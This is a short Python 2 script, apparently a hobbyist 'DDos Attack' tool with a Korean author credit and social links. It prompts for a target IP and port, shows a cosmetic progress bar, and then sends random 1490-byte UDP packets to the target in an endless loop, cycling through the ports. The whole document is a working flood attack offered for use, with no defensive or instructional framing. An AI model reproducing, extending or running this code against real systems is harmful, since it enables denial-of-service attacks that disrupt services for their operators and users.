import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print
print "저자 : 하핫FG"
print "You Tube : https://www.youtube.com/channel/UC0EK7teehMhAHco1S_WQpZg"
print "키카오톡 :https://open.kakao.com/me/FGs"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("시작")
os.system("시직")
print "[                    ] 0% "
time.sleep(3)
print "[=====               ] 25%"
time.sleep(4)
print "[==========          ] 50%"
time.sleep(4)
print "[===============     ] 75%"
time.sleep(0)
print "[====================] 100%"
time.sleep(0)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

